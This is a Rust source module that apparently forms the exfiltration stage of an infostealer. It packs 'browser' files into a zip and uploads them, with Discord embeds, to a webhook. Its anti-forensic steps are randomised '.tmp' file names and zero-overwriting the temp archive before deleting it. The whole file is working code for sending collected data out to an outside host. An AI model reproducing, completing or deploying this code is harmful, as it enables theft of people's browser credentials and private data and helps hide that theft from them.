use std::{env, fs, io::Write, time::{SystemTime, UNIX_EPOCH}};
use zip::write::FileOptions;
use serde_json::{json, Value};

fn temp_tag() -> String {
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    format!("{:x}{:x}", std::process::id(), nanos)
}

fn wipe_temp(path: &std::path::Path) {
    if let Ok(meta) = fs::metadata(path) {
        let len = meta.len().min(16 * 1024 * 1024) as usize;
        if len > 0 {
            let _ = fs::write(path, vec![0u8; len]);
        }
    }
    let _ = fs::remove_file(path);
}

fn build_zip(files: &[(String, String)]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let tag = temp_tag();
    let zip_path = env::temp_dir().join(format!("{tag}.tmp"));
    crate::logf!("zip building: {} entries", files.len());

    {
        let file = fs::File::create(&zip_path)?;
        let mut zip = zip::ZipWriter::new(file);
        let options = FileOptions::default()
            .compression_method(zip::CompressionMethod::Deflated);

        for (name, content) in files {
            zip.start_file(name, options)?;
            zip.write_all(content.as_bytes())?;
        }

        zip.finish()?;
    }

    let zip_data = fs::read(&zip_path)?;
    crate::logf!("zip size: {} bytes", zip_data.len());
    wipe_temp(&zip_path);
    Ok(zip_data)
}

async fn post_json_embeds(
    client: &reqwest::Client,
    webhook_url: &str,
    embeds: &[Value],
) -> Result<(), Box<dyn std::error::Error>> {
    if embeds.is_empty() {
        return Ok(());
    }
    let response = client
        .post(webhook_url)
        .json(&json!({ "embeds": embeds }))
        .send()
        .await?;
    let status = response.status();
    crate::logf!("webhook embeds send: HTTP {status}");
    if !status.is_success() {
        let body = response.text().await.unwrap_or_default();
        crate::logf!("webhook embeds body: {body}");
        return Err(format!("webhook failed: {status} {body}").into());
    }
    Ok(())
}

async fn post_zip_with_embeds(
    client: &reqwest::Client,
    webhook_url: &str,
    embeds: &[Value],
    zip_data: Vec<u8>,
) -> Result<(), Box<dyn std::error::Error>> {
    let tag = temp_tag();
    let mut payload = json!({});
    if !embeds.is_empty() {
        payload["embeds"] = json!(embeds);
    }

    let part = reqwest::multipart::Part::bytes(zip_data)
        .file_name(format!("{tag}.tmp"))
        .mime_str("application/octet-stream")?;

    let form = reqwest::multipart::Form::new()
        .text("payload_json", payload.to_string())
        .part("file", part);

    let response = client.post(webhook_url).multipart(form).send().await?;
    let status = response.status();
    crate::logf!("webhook combined send: HTTP {status}");
    if !status.is_success() {
        let body = response.text().await.unwrap_or_default();
        crate::logf!("webhook combined body: {body}");
        return Err(format!("webhook failed: {status} {body}").into());
    }
    Ok(())
}

/// Send Discord embeds and browser zip together (one request when both exist).
pub async fn send_combined(
    client: &reqwest::Client,
    webhook_url: &str,
    embeds: Vec<Value>,
    files: &[(String, String)],
) -> Result<(), Box<dyn std::error::Error>> {
    let has_embeds = !embeds.is_empty();
    let has_files = !files.is_empty();

    if !has_embeds && !has_files {
        crate::logs!("nothing to send (skipped)");
        return Ok(());
    }

    if has_files {
        let zip_data = build_zip(files)?;
        let (first, rest) = if embeds.len() <= 10 {
            (embeds, Vec::new())
        } else {
            let first: Vec<Value> = embeds.iter().take(10).cloned().collect();
            let rest: Vec<Value> = embeds.into_iter().skip(10).collect();
            (first, rest)
        };

        post_zip_with_embeds(client, webhook_url, &first, zip_data).await?;

        for chunk in rest.chunks(10) {
            post_json_embeds(client, webhook_url, chunk).await?;
        }
        return Ok(());
    }

    for chunk in embeds.chunks(10) {
        post_json_embeds(client, webhook_url, chunk).await?;
    }

    Ok(())
}

pub async fn send_zip(
    client: &reqwest::Client,
    webhook_url: &str,
    files: &[(String, String)],
) -> Result<(), Box<dyn std::error::Error>> {
    send_combined(client, webhook_url, Vec::new(), files).await
}
